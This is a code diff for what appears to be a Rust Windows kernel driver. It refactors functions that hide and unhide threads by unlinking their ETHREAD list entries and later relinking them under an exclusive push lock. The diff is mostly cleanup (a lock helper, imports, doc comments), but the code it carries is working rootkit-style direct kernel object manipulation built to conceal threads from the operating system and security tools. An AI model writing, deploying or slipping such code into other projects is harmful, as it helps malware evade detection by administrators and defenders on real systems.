@@ -2,17 +2,18 @@ use {
     spin::mutex::Mutex,
     alloc::{boxed::Box, vec::Vec}, 
     core::sync::atomic::{AtomicPtr, Ordering},
-    crate::utils::offsets::get_rundown_protect,
+    crate::utils::{offsets::get_rundown_protect, with_push_lock_exclusive},
     spin::lazy::Lazy,
     shared::{
-        structs::{HiddenThreadInfo, TargetThread, LIST_ENTRY, ThreadListInfo, EnumerateInfoInput}, 
-        vars::{MAX_TIDS, Options}
+        structs::{
+            HiddenThreadInfo, TargetThread, LIST_ENTRY, 
+            ThreadListInfo, EnumerateInfoInput
+        }, 
+        vars::MAX_TIDS,
+        enums::Options,
     }, 
     wdk_sys::{
-        ntddk::{
-            ExAcquirePushLockExclusiveEx, ExReleasePushLockExclusiveEx, 
-            ObfDereferenceObject, PsLookupThreadByThreadId
-        }, 
+        ntddk::{ObfDereferenceObject, PsLookupThreadByThreadId}, 
         NTSTATUS, PLIST_ENTRY, STATUS_INVALID_PARAMETER, STATUS_SUCCESS,
         STATUS_UNSUCCESSFUL, _LIST_ENTRY, PETHREAD, NT_SUCCESS
     }
@@ -37,9 +38,11 @@ impl Thread {
     /// Creates a new `Thread` instance by looking up a thread by its TID.
     ///
     /// # Parameters
+    /// 
     /// - `tid`: The process identifier (TID) to look up.
     ///
     /// # Returns
+    /// 
     /// - `Option<Self>`: Returns `Some(Self)` if the process lookup is successful, otherwise `None`.
     ///
     #[inline]
@@ -58,9 +61,11 @@ impl Thread {
     /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
     ///
     /// # Parameters
+    /// 
     /// - `process`:  A pointer to the `TargetProcess` structure.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn thread_toggle(thread: *mut TargetThread) -> NTSTATUS {
@@ -96,42 +101,42 @@ impl Thread {
         let list_entry = thread.e_thread.cast::<u8>().offset(thread_list_entry) as PLIST_ENTRY;
         let push_lock = thread.e_thread.cast::<u8>().offset(thread_lock) as *mut u64;
 
-        ExAcquirePushLockExclusiveEx(push_lock, 0);
-
-        let next = (*list_entry).Flink; // Thread (3)
-        let previous = (*list_entry).Blink; // Thread (1)
-        let list = LIST_ENTRY {
-            Flink: next as *mut LIST_ENTRY,
-            Blink: previous as *mut LIST_ENTRY,
-        };
-
-        let mut thread_info = THREAD_INFO_HIDE.lock();
-        let list_ptr = Box::into_raw(Box::new(list));
-        log::info!("Stored list entry at: {:?}", list_ptr);
-
-        thread_info.push(HiddenThreadInfo {
-            tid,
-            list_entry: AtomicPtr::new(list_ptr),
-        });
-
-        (*next).Blink = previous;
-        (*previous).Flink = next;
-
-        (*list_entry).Flink = list_entry;
-        (*list_entry).Blink = list_entry;
-
-        ExReleasePushLockExclusiveEx(push_lock, 0);
-        log::info!("Thread with TID {tid} hidden successfully.");
-
-        STATUS_SUCCESS
+        with_push_lock_exclusive(push_lock, || {
+            let next = (*list_entry).Flink; // Thread (3)
+            let previous = (*list_entry).Blink; // Thread (1)
+            let list = LIST_ENTRY {
+                Flink: next as *mut LIST_ENTRY,
+                Blink: previous as *mut LIST_ENTRY,
+            };
+    
+            let mut thread_info = THREAD_INFO_HIDE.lock();
+            let list_ptr = Box::into_raw(Box::new(list));
+            log::info!("Stored list entry at: {:?}", list_ptr);
+    
+            thread_info.push(HiddenThreadInfo {
+                tid,
+                list_entry: AtomicPtr::new(list_ptr),
+            });
+    
+            (*next).Blink = previous;
+            (*previous).Flink = next;
+    
+            (*list_entry).Flink = list_entry;
+            (*list_entry).Blink = list_entry;
+    
+            log::info!("Thread with TID {tid} hidden successfully.");
+            STATUS_SUCCESS
+        })
     }
 
     /// Unhide a process by removing it from the list of active threads.
     ///
     /// # Parameters
+    /// 
     /// - `tid`: The identifier of the target process (TID) to be hidden.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     unsafe fn unhide_thread(target: *mut TargetThread) -> NTSTATUS {
@@ -151,43 +156,40 @@ impl Thread {
         let list_entry = thread.e_thread.cast::<u8>().offset(thread_list_entry) as PLIST_ENTRY;
         let push_lock = thread.e_thread.cast::<u8>().offset(thread_lock) as *mut u64;
 
-        ExAcquirePushLockExclusiveEx(push_lock, 0);
-        
-        // Restoring Flink / Blink
-        let mut thread_info = THREAD_INFO_HIDE.lock();
-        if let Some(index) = thread_info.iter().position(|p| p.tid == tid) {
-            let thread = &thread_info[index];
-            let list = thread.list_entry.load(Ordering::SeqCst);
-            if list.is_null() {
-                log::error!("List entry stored in AtomicPtr is null");
-                return STATUS_INVALID_PARAMETER;
+        with_push_lock_exclusive(push_lock, || {
+            let mut thread_info = THREAD_INFO_HIDE.lock();
+            if let Some(index) = thread_info.iter().position(|p| p.tid == tid) {
+                let thread = &thread_info[index];
+                let list = thread.list_entry.load(Ordering::SeqCst);
+                if list.is_null() {
+                    log::error!("List entry stored in AtomicPtr is null");
+                    return STATUS_INVALID_PARAMETER;
+                }
+    
+                (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
+                (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;
+    
+                let next = (*list_entry).Flink; // Thread (3)
+                let previous = (*list_entry).Blink; // Thread (1)
+    
+                (*next).Blink = list_entry;
+                (*previous).Flink = list_entry;
+    
+                thread_info.remove(index);
+
+                log::info!("Thread with TID {tid} unhidden successfully.");
+                return STATUS_SUCCESS;
+            } else {
+                log::info!("TID ({tid}) Not found");
+                return STATUS_UNSUCCESSFUL;
             }
-
-            (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
-            (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;
-
-            let next = (*list_entry).Flink; // Thread (3)
-            let previous = (*list_entry).Blink; // Thread (1)
-
-            (*next).Blink = list_entry;
-            (*previous).Flink = list_entry;
-
-            thread_info.remove(index);
-        } else {
-            log::info!("TID ({tid}) Not found");
-            ExReleasePushLockExclusiveEx(push_lock, 0);
-            return STATUS_UNSUCCESSFUL;
-        }
-
-        log::info!("Thread with TID {tid} unhidden successfully.");
-        ExReleasePushLockExclusiveEx(push_lock, 0);
-
-        STATUS_SUCCESS
+        })
     }
 
     /// Enumerates and hides threads by populating the provided `ThreadListInfo` structure with thread IDs.
     ///
     /// # Parameters
+    /// 
     /// - `info_process`: A pointer to the `ThreadListInfo` structure to be populated.
     /// - `information`: A mutable reference to a `usize` value that will be updated with the size of the populated data.
     ///
@@ -210,6 +212,7 @@ impl Thread {
     /// Enumerates threads and performs actions based on the specified options (hide or protection).
     ///
     /// # Parameters
+    /// 
     /// - `input_target`: A pointer to the `EnumerateInfoInput` structure containing the target options.
     /// - `info_process`: A pointer to the `ThreadListInfo` structure to be populated.
     /// - `information`: A mutable reference to a `usize` value that will be updated with the size of the populated data.
